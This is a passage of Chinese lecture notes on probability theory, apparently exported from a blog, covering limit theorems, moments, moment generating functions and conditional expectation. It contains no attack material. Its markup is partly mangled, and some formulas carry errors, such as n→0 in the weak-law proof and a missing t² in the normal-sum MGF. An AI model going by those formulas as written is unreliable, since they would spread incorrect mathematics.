(LLN)</h2><ul><li><p><strong>定义</strong>  $X_1,X_2,\cdots$ <strong>iid</strong> (独立同分布), $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 定义:<br>$$<br>\overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i,, E(\overline{X})=\mu,,Var(\overline{X})=\dfrac{\sigma^2}{n}\rightarrow 0.<br>$$</p></li><li><p><strong>定义(Khinchin 弱大数定律)(WLLN)</strong> </p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 则 $\forall\varepsilon&gt;0$, 有<br>  $$<br>  \lim_{n\rightarrow\infty}P(\vert \overline{X}-\mu\vert\ge \varepsilon)=0.<br>  $$</p></li><li><p><strong>证明</strong>  我们有<br>  $$<br>  P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\dfrac{Var(\overline{X})}{\varepsilon^2}=\dfrac{\sigma^2}{n\varepsilon^2}\rightarrow 0, 当,n\rightarrow 0.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li><p>$\mu\approx\overline{X}$ (在很大概率意义下可以用作样本均值估计);</p></li><li><p>$\forall,\varepsilon&gt;0$, $\forall,\alpha&gt;0$, $\exists N&gt;0$ 使得当 $n\ge N$ 时<br>$$<br>P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\alpha.<br>$$<br>其中 $\varepsilon$ 体现了精度，$\alpha$ 体现了置信度.</p></li><li><p><strong>Bernoulli LLN</strong>: $X_i\sim B(p)$, 则特殊地得到 <strong>Bernoulli</strong> 大数定律。</p></li><li><p>方差有限条件可去掉, 结论依然成立;</p></li><li><p>可推广至不同的条件:</p><ul><li>$X_i$ 两两不相关,  $Var(X_i)$ 一致有界 (<strong>Chebyshev</strong>);</li><li>$Var(\overline{X})\rightarrow 0$ (<strong>Markov</strong>).</li></ul></li></ul></li><li><p><strong>定义(依概率收敛)</strong><br>$$<br>Y_n\stackrel{P}{\longrightarrow}Y\Longleftrightarrow\forall\varepsilon&gt;0, \lim_{n\rightarrow\infty}P(\vert Y_n-Y\vert\ge\varepsilon)=0.<br>$$</p></li><li><p><strong>注</strong>  <strong>WLLN</strong> $\Rightarrow\overline{X}\stackrel{P} {\longrightarrow}\mu$ (考虑偏差).</p></li><li><p><strong>定义(Kolmogov 强大数定律)(SLLN)</strong></p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$. 则有<br>  $$<br>  P(\omega\in\Omega\mid \lim_{n\rightarrow\infty}\overline{X_n}(\omega)=\mu)=P(\lim_{n\rightarrow\infty}\overline{X}=\mu)=1.<br>  $$</p></li><li><p><strong>注</strong>  若 $X_i\sim B(p)$ 则 $\overline{X}$ 为频率,从而概率的频率解释是合理的.</p></li><li><p><strong>定义(以概率 1 收敛)</strong><br>$$<br>Y_n\stackrel{a.s.}{\longrightarrow}Y\Longleftrightarrow P(\lim_{n\rightarrow\infty}Y_n=Y)=1.<br>$$</p></li><li><p><strong>注</strong>  <strong>SLLN</strong> $\Rightarrow\overline{X}\stackrel{a.s.} {\longrightarrow}\mu$ (逐点考虑).</p></li><li><p><strong>例</strong>  (<strong>Monte Carlo</strong> 积分)</p></li><li><p><strong>解答</strong>  在 $[a,b]\times [0,c]$ 上取点 $(X_i,Y_i)$ <strong>iid</strong> 在矩形内均匀分布. 定义<br>  $$<br>  I_i=<br>  \begin{cases}<br>  1,(X_i,Y_i)\in D;\<br>  0,(X_i,Y_i)\notin D.<br>  \end{cases}<br>  $$<br>  则 $I_i\stackrel{iid} {\longrightarrow}B(p)$. 我们有<br>  $$<br>  P=\dfrac{1}{(b-a)c}\int_a^bg(x)dx\approx\dfrac{1}{n}\sum_{i=1}^{n}I_i.<br>  $$</p></li><li><p><strong>例</strong>  两种收敛有什么差别?</p></li><li><p><strong>解答</strong>  考虑 $\Omega=[0,1]$ 均匀分布 (从而有 ($\Omega,\mathscr{F},P$)). 我们构造<br>$$<br>Y_1(\omega)=\omega+I_{[0,1]}(\omega)\<br>Y_2(\omega)=\omega+I_{[0,\frac{1}{2}]}(\omega)\<br>Y_3(\omega)=\omega+I_{[\frac{1}{2},1]}(\omega)\<br>Y_4(\omega)=\omega+I_{[0,\frac{1}{3}]}(\omega)\<br>Y_5(\omega)=\omega+I_{[\frac{1}{3},\frac{2}{3}]}(\omega)\<br>Y_6(\omega)=\omega+I_{[\frac{2}{3},1]}(\omega)\<br>\cdots\<br>Y(\omega)=\omega.<br>$$<br>因此有 $Y_n\stackrel{P} {\longrightarrow}Y$, 但是 $Y_n\stackrel{a.s.} {\longrightarrow}Y$ 不成立.</p><p>这是因为 $\forall,\omega_0\in(0,1)$, $Y_n(\omega_0)$ 是振荡的, 它的极限不存在.</p></li></ul><h2 id="中心极限定理-CLT"><a href="#中心极限定理-CLT" class="headerlink" title="中心极限定理 (CLT)"></a>中心极限定理 (CLT)</h2><ul><li><p><strong>定义(中心极限定理)(CLT)</strong></p><p>若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 我们有<br>$$<br>\lim_{n\rightarrow\infty}P\left(\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}\le x\right)=\Phi(x),,\forall,x\in\mathbb{R}.<br>$$<br>其中 $\Phi(x)$ 为 $N(0,1)$ 的 <strong>CDF</strong>. 也即<br>$$<br>\lim_{n\rightarrow\infty}P\left(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le x\right)=\Phi(x),,\forall,x\in\mathbb{R}.<br>$$</p></li><li><p><strong>证明</strong>  只在 $X_i$ 的 <strong>MGF</strong> 存在情形下证明, 记 $M(t)=M_{X_i}(t)$.</p><p>  不失一般性地, 令 $\mu=0$, $\sigma^2=1$. 因此<br>  $$<br>  M(0)=E(1)=1,\<br>  M’(0)=E(X_i)=\mu=0,\<br>  M’’(0)=E(X_i^2)=\sigma^2=1.<br>  $$<br>  我们得到<br>  $$<br>  \begin{aligned}<br>  E(e^{t\frac{X_1+\cdots+X_n}{\sqrt{n}}})&amp;=M^n(\tfrac{t}{\sqrt{n}})\<br>  &amp;=\left(1+\tfrac{t^2}{2n}+o(\tfrac{t^2}{n})\right)^n\<br>  &amp;\rightarrow e^{\tfrac{t^2}{2}}.<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong></p><ul><li><p>上述 <strong>CLT</strong> 通常称为 <strong>Lindeberg-Levy CLT</strong>;</p></li><li><p><strong>CLT</strong> $\Rightarrow X_1+\cdots+X_n\sim N(n\mu,n\sigma^2)$, $\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n})$;</p></li><li><p><strong>(DeMoivre-Laplace CLT)</strong>  </p><p>  若 $X_i\sim B(p)$, 则 $\sum\limits_{i=1}^{n}X_i\sim B(n,p)\stackrel{CLT} {\longrightarrow}$ 正态分布.</p></li></ul></li><li><p><strong>定义(二项分布下 CLT 的连续性修正)</strong></p><p>我们有 $P(t_1\le\sum\limits_{i=1}^{n}X_i\le t_2)\approx\Phi(y_2)-\Phi(y_1)$. 其中<br>$$<br>\begin{cases}<br>y_1=\dfrac{t_1-np-\tfrac{1}{2}}{\sqrt{np(1-p)}},\<br>y_2=\dfrac{t_2-np+\tfrac{1}{2}}{\sqrt{np(1-p)}}.<br>\end{cases}<br>$$<br>修正形式可计算单点 $P(S_n=k)$ 的概率, 对其他离散变量也同样适用.</p></li><li><p><strong>定义(依分布收敛)</strong><br>$$<br>Y_n\stackrel{d}{\longrightarrow}Y\Longleftrightarrow \lim_{n\rightarrow\infty}F_n(x)=F(x).<br>$$</p></li><li><p><strong>注</strong>  <strong>CLT</strong> $\Rightarrow Z_n=\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}=\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}$ (标准化).</p></li><li><p><strong>例(选举问题)</strong>  设 $p$ 为选民支持率(未知), 随机调查 $n$ 个人, 支持比例为 $p_n=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i$, 其中 $X_i\sim B(p)$. 若 $\varepsilon=0.03$, $1-\alpha=0.95$, 求 $n$ 的取值.</p></li><li><p><strong>解答</strong>  有<br>  $$<br>  P(\left|p_n-p\right|\ge\varepsilon)\le \alpha.<br>  $$<br>  由 <strong>CLT</strong> 可得<br>  $$<br>  \begin{aligned}<br>  P(\left|p_n-p\right|\ge\varepsilon)&amp;=1-P\Big(-\dfrac{\sqrt{n}\varepsilon}{\sigma}\le\dfrac{p_n-p}{\tfrac{\sigma}{\sqrt{n}}}\le\dfrac{\sqrt{n}\varepsilon}{\sigma}\Big)\<br>  &amp;=1-\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)+\Phi\Big(-\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\<br>  &amp;=2-2\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\le\alpha.<br>  \end{aligned}<br>  $$<br>  即得<br>  $$<br>  \Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\ge 1-\dfrac{\alpha}{2}.<br>  $$<br>  为使得对任意 $p$ 成立, 取 $p=\dfrac{1}{2}$, 即有<br>  $$<br>  \Phi\Big(2\sqrt{n}\varepsilon\Big)\ge 1-\dfrac{\alpha}{2}.<br>  $$<br>  注意到 $\Phi(1.96)\approx 0.975=1-\dfrac{\alpha}{2}$, 因此取 $n\ge 1068$ 即可 (与 $N$ 无关).</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="尾部概率控制"><a href="#尾部概率控制" class="headerlink" title="尾部概率控制"></a>尾部概率控制</h3><h3 id="极限定理"><a href="#极限定理" class="headerlink" title="极限定理"></a>极限定理</h3><ul><li><strong>LLN</strong>: 弱 or 强</li><li><strong>CLT</strong></li></ul><h3 id="三种收敛"><a href="#三种收敛" class="headerlink" title="三种收敛"></a>三种收敛</h3><h3 id="CLT-应用"><a href="#CLT-应用" class="headerlink" title="CLT 应用"></a><strong>CLT</strong> 应用</h3><p>$$<br>\begin{cases}<br>X_1+\cdots+X_n\sim N(n\mu,n\sigma^2);\<br>\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n}).<br>\end{cases}<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记4</title>
      <link href="/49/"/>
      <url>/49/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-4-随机变量的数字特征"><a href="#Chap-4-随机变量的数字特征" class="headerlink" title="Chap 4 随机变量的数字特征"></a>Chap 4 随机变量的数字特征</h1><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ul><li><p><strong>定义(期望)</strong><br>  $$<br>  E(X)=<br>  \begin{cases}<br>  \sum\limits_{i}x_if(x_i)\<br>  \int\limits_{-\infty}^{\infty}xf(x)dx\<br>  \end{cases}<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>存在 $\Leftrightarrow$ 绝对收敛;</li><li><strong>(Lebesque-Stieltjes 积分)</strong>  一般定义: $E(X)=\int\limits_{-\infty}^{\infty}xdF$;</li><li>集中趋势的一种刻画;</li><li>$E((X_1,\cdots,X_n)):=(E(X_1),\cdots,E(X_n))$.</li></ul></li><li><p><strong>性质</strong></p><ul><li><p>$$<br>E(g(X_1,\cdots,X_n))=<br>\begin{cases}<br>\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)\<br>\int\limits_{\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)dx_1\cdots dx_n<br>\end{cases}<br>$$</p></li><li><p><strong>(线性性质)</strong>  $E(aX+bY)=aE(X)+bE(Y)$;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立, 则 $E(X_1\cdots X_n)=E(X_1)\cdots E(X_n)$.</p></li></ul></li></ul><h2 id="分位数"><a href="#分位数" class="headerlink" title="分位数"></a>分位数</h2><ul><li><p><strong>定义(中位数)</strong>  $X$ 连续, 若 $P(X\le m)=\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</p></li><li><p><strong>注</strong></p><ul><li>$F(m)=\dfrac{1}{2}$;</li><li>$P(X&lt;m)=\dfrac{1}{2}=P(X&gt;m)$;</li><li>中位数不一定唯一.</li></ul></li><li><p><strong>定义(中位数)</strong>  若 $P(X&lt;m)\le\dfrac{1}{2}$ 且 $P(X&gt;m)\le\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</p></li><li><p><strong>定义(下侧 $\alpha-$分位数)</strong></p><p>  $\forall\alpha\in(0,1)$, 若 $P(X&lt;a)\le\alpha$ 且 $P(X&gt;a)\le 1-\alpha$, 称 $a$ 为 $X$ 的下侧 $\alpha-$分位数.</p></li><li><p><strong>注</strong></p><ul><li>若 $X$ 连续, 则 $P(X&lt;a)=\alpha$;</li><li>$F^{-1}(\alpha)=\inf{x\mid F(x)\ge\alpha}$ 为一个 $\alpha$ 分位数.</li></ul></li><li><p><strong>注</strong></p><ul><li>中位数也是集中趋势的一种刻画;</li><li>众数 (方便定义: $f(x)$ 的最大值点).</li></ul></li></ul><h2 id="方差"><a href="#方差" class="headerlink" title="方差"></a>方差</h2><ul><li><p><strong>定义(方差与标准差)</strong>  给出定义:<br>$$<br>Var(X):=E((X-E(X))^2)=E(X^2)-E^2(X);\<br>SD(X):=\sqrt{Var(X)}.<br>$$</p></li><li><p><strong>注</strong>  刻画了数据的集中程度.</p></li><li><p><strong>性质</strong></p><ul><li>$Var(c)\equiv 0$;</li><li>$Var(X+c)\equiv Var(x)$;</li><li>$Var(cX)\equiv c^2Var(X)$;</li><li>$Var(X+Y)=Var(X)+Var(Y)+2E((X-E(X))(Y-E(Y)))$.</li></ul></li><li><p><strong>注</strong>  定义变异系数 $\dfrac{\sigma}{\mu}$.</p></li></ul><h2 id="协方差与相关系数"><a href="#协方差与相关系数" class="headerlink" title="协方差与相关系数"></a>协方差与相关系数</h2><ul><li><p><strong>定义(协方差)</strong><br>$$<br>Cov(X,Y):=E((X-\mu_1)(Y-\mu_2)).<br>$$</p></li><li><p><strong>注</strong></p><ul><li><p>$Cov(X,X)=Var(X)$;</p></li><li><p>$Cov(X,Y)=Cov(Y,X)$;</p></li><li><p>$Cov(X,Y)=E(XY)-\mu_1\mu_2=E(XY)-E(X)E(Y)$;</p></li><li><p>$Cov(aX_1+bX_2+c,Y)=aCov(X_1,Y)+bCov(X_2,Y)$.</p></li></ul></li><li><p><strong>定义(协方差矩阵)</strong>  对 $\overline{X}=(X_1,\cdots,X_n), \overline{Y}=(Y_1,\cdots,Y_n).$ 我们有协方差矩阵<br>  $$<br>  \begin{aligned}<br>  Cov(\overline{X},\overline{Y})&amp;=(Cov(\overline{X}_i,\overline{Y}<em>j))</em>{n\times n}\<br>  &amp;=E((\overline{X}-E(\overline{X}))^{T}(\overline{Y}-E(\overline{Y}))).<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong>  方差矩阵:<br>$$<br>\begin{aligned}<br>Var(\overline{X})&amp;=Cov(\overline{X},\overline{Y})\<br>&amp;=(Cov(\overline{X}<em>i,\overline{X}<em>j))</em>{n\times n}\<br>&amp;=(\sigma</em>{ij})_{n\times n}.<br>\end{aligned}<br>$$</p></li><li><p><strong>定义(相关系数)</strong><br>  $$<br>  Corr(X,Y)=\dfrac{Cov(X,Y)}{\sigma_1\sigma_2}=E(\dfrac{X-\mu_1}{\sigma_1}\cdot\dfrac{Y-\mu_2}{\sigma_2}).<br>  $$</p></li><li><p><strong>定理</strong></p><ul><li>若 $X,Y$ 独立, 则 $Corr(X,Y)=0$, 称为 $X,Y$ 不相关.</li><li>联合正态的特殊情况, 不相关可推出独立.</li><li>$\vert Corr(X,Y)\vert\le 1$, 等号成立当且仅当 $\exist,a,b$ 使得 $P(Y=aX+b)=1$.</li></ul></li><li><p><strong>证明</strong>  给出引理 <strong>Schwartz 不等式</strong>:<br>$$<br>E^2(UV)\le E(U^2)E(V^2).<br>$$<br>取等当且仅当 $\exist,c\in\mathbb{R}$ 使得 $U=cV$. 取 $U=\dfrac{X-\mu_1}{\sigma_1},V=\dfrac{Y-\mu_2}{\sigma_2}$.</p></li><li><p><strong>注</strong></p><ul><li><p>$\rho:=Corr(X,Y)=\pm 1$, 则 $a=\pm\dfrac{\sigma_2}{\sigma_1}$;</p></li><li><p>$\rho:=Corr(X,Y)=0$ (不相关) $\not\Rightarrow$ 独立;</p><p>如 $X\sim N(0,1)$, $Y=X^2$ 不相关但是不独立.</p></li><li><p>相关系数为线性相关系数.</p></li></ul></li><li><p><strong>例</strong>  $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则<br>$$<br>\rho=Corr(X_1,X_2).<br>$$</p></li></ul><h2 id="矩"><a href="#矩" class="headerlink" title="矩"></a>矩</h2><ul><li><p><strong>定义(矩)</strong>  称<br>  $$<br>  E((X-c)^k)(k=1,2,\cdots)<br>  $$<br>  为 $X$ 关于 $c$ 点的 $k$ 阶矩. 特别地, $c=0$ 对应原点矩, $c=\mu$ 对应中心矩.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)=$ 1 阶原点矩, 0 $\equiv$ 1 阶中心矩;</li><li>$Var(X)=$ 2 阶中心矩;</li></ul></li><li><p><strong>定义(偏度系数)</strong><br>  $$<br>  Skew(X)=\dfrac{E((X-\mu)^3)}{\sigma^3}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^3\right).<br>  $$<br>  称为 3 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>0 $\equiv$ 1 阶标准矩, 1 $\equiv$ 2 阶标准矩.</li><li>$Skew(X)&lt;0$ 表示负偏, $Skew(X)&gt;0$ 表示正偏, 刻画非对称程度;</li><li>相比于 5 阶及以上的奇数阶矩, 3 阶矩的计算相对简单, 噪声影响较小;</li><li>不是唯一的刻画偏度的特征数.</li></ul></li><li><p><strong>定义(峰度系数)</strong><br>  $$<br>  Kurt(X)=\dfrac{E((X-\mu)^4)}{\sigma^4}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^4\right).<br>  $$<br>  称为 4 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>正态分布的峰度 $\equiv$ 3, 超额峰度 $:=Kurt(X)-3$;</li><li>$Kurt(X)&gt;3\leftrightarrow$ 尖峰厚尾;</li><li>没有一个数字特征能完美刻画尾部形.</li></ul></li></ul><h2 id="矩母函数"><a href="#矩母函数" class="headerlink" title="矩母函数"></a>矩母函数</h2><ul><li><p><strong>定义(矩母函数)</strong></p><p>若 $M_X(t)=E(e^{tX})$ 在 $t=0$ 的某个邻域内存在, 则称 $M_X(t)$ 为 $X$ 的矩母函数. 否则称 $X$ 的矩母函数 <strong>MGF</strong> 不存在.</p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>M_X(t)&amp;=E(e^{tX})\<br>&amp;=\int_{0}^{\infty}e^{tx}\lambda e^{-\lambda x}dx\<br>&amp;=\dfrac{\lambda}{\lambda - t},,t&lt;\lambda.<br>\end{aligned}<br>$$</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>M_X(t)&amp;=E(e^{tX})\<br>&amp;=\dfrac{1}{\sqrt{2\pi}}\int_{0}^{\infty}e^{tx}e^{-\tfrac{1}{2}x^2}dx\<br>&amp;=e^{\tfrac{t^2}{2}},,t\in\mathbb{R}.<br>\end{aligned}<br>$$</p></li><li><p><strong>性质</strong></p><ul><li>$M_X(0)\equiv 1$;</li><li>$Y=aX+b$, 则 $M_Y(t)=E(e^{t(aX+b)})=e^{tb}M_X(at)$.</li></ul></li><li><p><strong>例</strong>  $Y\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>M_Y(t)&amp;=e^{t\mu}M_X(\sigma t)\<br>&amp;=e^{\tfrac{\sigma^2t^2}{2}+\mu t},,t\in\mathbb{R}.<br>\end{aligned}<br>$$</p></li><li><p><strong>性质(矩母函数确定矩)</strong><br>$$<br>E(X^n)=M_X^{(n)}(0).<br>$$</p></li><li><p><strong>证明</strong><br>  $$<br>  \begin{aligned}<br>  M_X^{(n)}(t)&amp;=\sum_{n=0}^{\infty}\dfrac{M_X^{(n)}(0)}{n!}t^n.<br>  \end{aligned}<br>  $$<br>  又因为<br>  $$<br>  \begin{aligned}<br>  M_X(t)&amp;=E(e^{tX})\<br>  &amp;=E\left(\sum_{n=0}^{\infty}\dfrac{X^n}{n!}t^n\right)\<br>  &amp;=\sum_{n=0}^{\infty}\dfrac{E(X^n)}{n!}t^n.\<br>  \end{aligned}<br>  $$<br>  比较系数即得.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>M_X(t)&amp;=E(e^{tX})\<br>&amp;=e^{\tfrac{t^2}{2}},,t\in\mathbb{R}\<br>&amp;=\sum_{n=0}^{\infty}\dfrac{(\tfrac{t^2}{2})^n}{n!}\<br>&amp;=\sum_{n=0}^{\infty}\dfrac{(2n)!}{2^nn!}\cdot\dfrac{t^{2n}}{(2n)!}<br>\end{aligned}<br>$$<br>可得<br>$$<br>\begin{cases}<br>E(X^{2n+1})\equiv 0,\<br>E(X^{2n})=\dfrac{(2n)!}{2^nn!}.<br>\end{cases}<br>$$</p></li><li><p><strong>性质(矩母函数确定分布)</strong></p><p>若 $\exists$ $a&gt;0$, 使得 $M_X(t)=M_Y(t)$, $\forall,t\in(-a,a)$, 则 $X$, $Y$ 同分布.</p></li><li><p><strong>例</strong>  $M_X(t)=\dfrac{1}{4}e^{-t}+\dfrac{1}{2}+\dfrac{1}{8}e^{4t}+\dfrac{1}{8}e^{5t}$.</p></li><li><p><strong>解答</strong>  $X$ 离散, 设 $P(X=k)=p_k$, 我们有<br>$$<br>M_X(t)=E(e^{tX})=\sum_ke^{tk}p_k.<br>$$<br>可得分布<br>$$<br>P(X=-1)=\dfrac{1}{4};\<br>P(X=0)=\dfrac{1}{2};\<br>P(X=4)=\dfrac{1}{8};\<br>P(X=5)=\dfrac{1}{8}.<br>$$</p></li><li><p><strong>例</strong>  $f_1(x)=\dfrac{1}{\sqrt{2\pi}x}e^{-\tfrac{(\ln x)^2}{2}}, x&gt;0$, $f_2(x)=f_1(x)+f_1(x)\sin(2\pi\ln x)$.</p></li><li><p><strong>解答</strong>  注意到<br>$$<br>\begin{aligned}<br>E(X_2^n)&amp;=E(X_1^n)+\int_{0}^{\infty}x^nf_1(x)\sin(2\pi\ln x)dx\<br>&amp;=0,(令 ,y=\ln x-n)\<br>\end{aligned}<br>$$<br>这是一个同矩不同分布的例子.</p></li><li><p><strong>性质(独立随机变量和的分布)</strong></p><p>若 $X$, $Y$ 独立, 则 $M_{X+Y}(t)=M_X(t)M_Y(t)$.</p></li><li><p><strong>证明</strong>  注意到<br>  $$<br>  \begin{aligned}<br>  M_{X+Y}(t)&amp;=E(e^{t(X+Y)})\<br>  &amp;=E(e^{tX}e^{tY})\<br>  &amp;=E(e^{tX})E(e^{tY})\<br>  &amp;=M_X(t)M_Y(t).<br>  \end{aligned}<br>  $$</p></li><li><p><strong>例</strong>  $X_1,X_2,\cdots,X_n$ 独立正态, 则 $X_1+X_2+\cdots+X_n$ 正态.</p></li><li><p><strong>解答</strong>  考察 $X_i\sim N(\mu_i,\sigma_i^2)$, 其中 $i=1,2$. 那么<br>$$<br>M_{X+Y}(t)=M_X(t)M_Y(t)=e^{\tfrac{1}{2}(\sigma_1^2+\sigma_2^2)+(\mu_1+\mu_2)t}.<br>$$<br>进而得到<br>$$<br>X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2).<br>$$</p></li><li><p><strong>注</strong></p><ul><li>若 $N$ 为有限数;</li><li>若 $N$ 为随机变量, 与 $X_i$ 独立.</li></ul></li><li><p><strong>注</strong></p><ul><li><p>$(X_1,X_2,\cdots,X_n)$ 的 <strong>MGF</strong> 为:<br>$$<br>M_{(X_1,X_2,\cdots,X_n)}(t_1,t_2,\cdots,t_n)=E(e^{t_1X_1+t_2X_2+\cdots+t_nX_n}).<br>$$</p></li><li><p>特征函数<br>$$<br>E(e^{itX}), i^2=-1.<br>$$</p></li></ul></li></ul><h2 id="条件期望"><a href="#条件期望" class="headerlink" title="条件期望"></a>条件期望</h2><ul><li><p><strong>定义(条件期望)</strong><br>$$<br>E(Y\mid X\in A)=<br>\begin{cases}<br>\sum\limits_iy_iP(Y=y_i\mid X\in A)\<br>\int\limits_{-\infty}^{\infty}yf(y\mid X\in A)dy\<br>\end{cases}<br>$$</p><p>$$<br>E(Y\mid x)=<br>\begin{cases}<br>\sum\limits_iy_iP(Y=y_i\mid X=x)\<br>\int\limits_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\<br>\end{cases}<br>$$</p><p>我们称 $E(Y\mid X)$ 为新的随机变量 $h(X)$, 是 $Y$ 对 $X$ 的回归函数.</p></li><li><p><strong>例</strong>  $(X,Y)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 $E(Y\mid X)=\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(X-\mu_1)$.</p></li><li><p><strong>例</strong>  甲乙两种同类产品, 评价使用寿命为 10 年, 15 年, 市场占有率为 60%, 40%. 随机购买一件产品, 求期望寿命?</p></li><li><p><strong>解答</strong>  为 $10\times 60%+15\times 40%=12$ 年.</p><p>若记 $X$ 为产品类型, $Y$ 为产品寿命, 则上式可写成<br>$$<br>\begin{aligned}<br>E(Y)&amp;=12\<br>&amp;=10\times 60%+15\times 40%\<br>&amp;=E(Y\mid X=1)P(X=1)+E(Y\mid X=2)P(X=2)\<br>&amp;=E[E(Y\mid X)].<br>\end{aligned}<br>$$<br>不同取值分层平均并加权.</p></li><li><p><strong>定义(全期望公式)</strong><br>  $$<br>  E(Y)=E[E(Y\mid X)].<br>  $$</p></li><li><p><strong>证明</strong>  以连续型为例:<br>  $$<br>  \begin{aligned}<br>  E(Y\mid x)&amp;=\int_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\<br>  &amp;=\int_{-\infty}^{\infty}y\dfrac{f(x,y)}{f_X(x)}dy<br>  \end{aligned}<br>  $$<br>  从而有<br>  $$<br>  \begin{aligned}<br>  E[E(Y\mid X)]&amp;=\int_{-\infty}^{\infty}E(Y\mid x)f_X(x)dx\<br>  &amp;=\int_{-\infty}^{\infty}\int_{-\infty}^{\infty}yf(x,y)dydx\<br>  &amp;=E(Y).<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong>  一般地, $E[g(X,Y)]=E[E(g(X,Y)\mid X)]$.</p></li><li><p><strong>定理(均方最优预测)</strong><br>$$<br>E[(Y-g(X))^2]\ge E[(Y-h(X))^2]=E[(Y-E(Y\mid X))^2]<br>$$<br>称为均方误差 <strong>MSE</strong> 下的最优预测.</p></li><li><p><strong>证明</strong><br>  $$<br>  E[(Y-c)^2]\ge E[(Y-E(Y))^2].<br>  $$<br>  因此<br>  $$<br>  E[(Y-g(X))^2\mid X]\ge E[(Y-E(Y\mid X))^2\mid X].<br>  $$<br>   两边对 $X$ 取均值, 可得<br>  $$<br>  E[(Y-g(X))^2]\ge E[(Y-E(Y\mid X))^2].<br>  $$</p></li><li><p><strong>注</strong></p><ul><li><p>$E(Y\mid X)$ 依赖 $(X,Y)$ 的联合分布 (不易获取);</p></li><li><p>转而求最优线性预测:<br>$$<br>\min_{a,b}E[(Y-(aX+b))^2],(最小二乘法)<br>$$</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记3</title>
      <link href="/48/"/>
      <url>/48/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-3-联合分布"><a href="#Chap-3-联合分布" class="headerlink" title="Chap 3 联合分布"></a>Chap 3 联合分布</h1><h2 id="随机向量"><a href="#随机向量" class="headerlink" title="随机向量"></a>随机向量</h2><ul><li><p><strong>定义(随机向量)</strong>  我们称<br>$$<br>(X_1,\cdots,X_n):\Omega\rightarrow\mathbb{R}^n<br>$$<br>为随机向量, 当 $X_i(1\le i\le n)$ 均为随机变量.</p></li><li><p><strong>定义(联合 CDF)</strong><br>  $$<br>  F(x_1,\cdots,x_n):=F(X_1\le x_1,\cdots,X_n\le x_n),\forall,(x_1,\cdots,x_n)\in\mathbb{R}^n.<br>  $$</p></li><li><p><strong>注</strong>  若 $X_i:\Omega_i\rightarrow\mathbb{R}$, 需扩充 $\Omega=\Omega_1\times\cdots\Omega_n$.</p></li></ul><h2 id="离散分布"><a href="#离散分布" class="headerlink" title="离散分布"></a>离散分布</h2><ul><li><p><strong>定义(离散型随机向量)</strong><br>$$<br>(X_1,X_2,\cdots,X_n)为离散型\Leftrightarrow X_i(1\le i\le n)为离散型.<br>$$</p></li><li><p><strong>定义(概率质量函数)(PMF)</strong><br>  $$<br>  \begin{aligned}<br>  